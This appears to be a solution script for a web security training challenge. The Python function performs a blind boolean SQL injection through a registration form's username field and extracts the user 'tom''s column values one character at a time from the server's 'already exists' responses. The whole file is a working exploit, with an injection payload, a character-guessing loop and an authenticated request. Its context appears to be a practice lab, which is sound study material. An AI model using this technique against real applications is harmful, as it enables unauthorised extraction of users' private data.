import json
import requests
from config.settings import SESSION_COOKIE, SERVER_URL

def extract_tom_details(table_name, columns):
    """
    Extracts details for the user 'Tom' from a specific table.

    Args:
        table_name (str): The table to query.
        columns (list): List of column names in the table.

    Returns:
        dict: A dictionary with column names as keys and extracted values as data.
    """
    if not SESSION_COOKIE or not SERVER_URL:
        raise ValueError("Server URL or session cookie is not configured in environment settings.")

    headers = {
        'Cookie': SESSION_COOKIE,
    }

    def extract_value(column_name, char_index):
        value = ''
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789!@#$%^&*()'
        alphabet_index = 0

        while True:
            payload = "' OR (SELECT substring({}, {}, 1) FROM {} WHERE USERID = 'tom') = '{}' --".format(
                column_name, char_index, table_name, alphabet[alphabet_index]
            )
            data = {
                'username_reg': payload,
                'email_reg': 'a@a',
                'password_reg': 'a',
                'confirm_password_reg': 'a'
            }
            r = requests.put(f'{SERVER_URL}/SqlInjectionAdvanced/challenge', headers=headers, data=data)

            try:
                response = json.loads(r.text)
            except:
                return None

            if "already exists" not in response.get('feedback', ''):
                alphabet_index += 1
                if alphabet_index >= len(alphabet):
                    break
            else:
                value += alphabet[alphabet_index]
                alphabet_index = 0
                char_index += 1

        return value

    user_data = {}
    for column in columns:
        user_data[column] = extract_value(column, 1) or 'NULL'

    return user_data
